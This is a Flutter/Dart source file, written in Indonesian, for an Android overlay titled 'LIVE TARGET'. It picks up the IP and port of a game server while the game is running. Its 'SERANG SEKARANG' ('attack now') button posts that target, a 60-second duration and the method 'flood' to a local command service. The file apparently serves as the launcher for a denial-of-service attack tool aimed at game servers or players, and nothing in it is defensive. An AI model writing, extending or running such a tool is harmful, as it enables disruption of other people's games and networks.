import 'package:flutter/material.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';
import 'main.dart';

/// Entry point untuk overlay window (dipanggil oleh flutter_overlay_window)
@pragma("vm:entry-point")
void overlayMain() {
  runApp(const MaterialApp(
    debugShowCheckedModeBanner: false,
    home: LiveTargetOverlay(),
  ));
}

class LiveTargetOverlay extends StatefulWidget {
  const LiveTargetOverlay({super.key});

  @override
  State<LiveTargetOverlay> createState() => _LiveTargetOverlayState();
}

class _LiveTargetOverlayState extends State<LiveTargetOverlay> {
  String capturedIp = '';
  int capturedPort = 10001;
  String status = 'Menunggu koneksi game...';
  String sessionKey = '';
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadSession();
    _listenForIPData();
  }

  Future<void> _loadSession() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      sessionKey = prefs.getString('session_key') ?? '';
    });
  }

  /// FIX: Listen data real-time dari auto_detect_page via FlutterOverlayWindow.shareData
  void _listenForIPData() {
    FlutterOverlayWindow.overlayListener.listen((data) {
      if (data != null && data is Map) {
        final type = data['type'];
        if (type == 'ip_detected') {
          setState(() {
            capturedIp = data['ip'] ?? '';
            capturedPort = data['port'] ?? 10001;
            status = '🎯 Target ditemukan!';
            isLoading = false;
          });
        } else if (type == 'game_stopped') {
          setState(() {
            capturedIp = '';
            status = 'Game tidak aktif';
            isLoading = true;
          });
        }
      }
    });
  }

  Future<void> _launchAttack() async {
    if (capturedIp.isEmpty || sessionKey.isEmpty) {
      setState(() => status = '❌ IP atau session tidak valid');
      return;
    }

    setState(() => status = 'Mengirim serangan...');

    try {
      final response = await http.post(
        Uri.parse('http://127.0.0.1:4113/sendCommand'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'target': capturedIp,
          'port': capturedPort,
          'duration': 60,
          'method': 'flood',
        }),
      );

      final data = jsonDecode(response.body);
      if (response.statusCode == 200 && data['sended'] == true) {
        setState(() => status = '✅ Attack launched!');
      } else {
        setState(() =>
            status = '❌ Gagal: ${data['message'] ?? 'Unknown error'}');
      }
    } catch (e) {
      setState(() => status = '❌ Error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Material(
      color: Colors.transparent,
      child: Container(
        width: 300,
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: const LinearGradient(
            colors: [Color(0xFFB71C1C), Color(0xFF0A0A0A)],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
          ),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: Colors.redAccent, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.red.withOpacity(0.5),
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Row(
              children: [
                const Icon(Icons.my_location, color: Colors.redAccent),
                const SizedBox(width: 8),
                const Text(
                  'LIVE TARGET',
                  style: TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                  ),
                ),
                const Spacer(),
                IconButton(
                  icon: const Icon(Icons.close, color: Colors.white70),
                  onPressed: () => FlutterOverlayWindow.closeOverlay(),
                ),
              ],
            ),
            const Divider(color: Colors.redAccent),
            const SizedBox(height: 12),
            if (isLoading)
              const Column(
                children: [
                  CircularProgressIndicator(color: Colors.redAccent),
                  SizedBox(height: 8),
                  Text('Menunggu game dimulai...',
                      style: TextStyle(color: Colors.white70, fontSize: 12)),
                ],
              )
            else
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.5),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Column(
                  children: [
                    Row(
                      children: [
                        const Icon(Icons.dns, color: Colors.greenAccent, size: 16),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            capturedIp,
                            style: const TextStyle(
                              color: Colors.white,
                              fontSize: 14,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 4),
                    Text(
                      'Port: $capturedPort',
                      style: const TextStyle(color: Colors.white70),
                    ),
                  ],
                ),
              ),
            const SizedBox(height: 16),
            Text(
              status,
              style: const TextStyle(color: Colors.white70, fontSize: 12),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 12),
            ElevatedButton(
              onPressed: (capturedIp.isEmpty || isLoading) ? null : _launchAttack,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.redAccent,
                foregroundColor: Colors.white,
                minimumSize: const Size(double.infinity, 40),
              ),
              child: const Text('SERANG SEKARANG'),
            ),
          ],
        ),
      ),
    );
  }
}
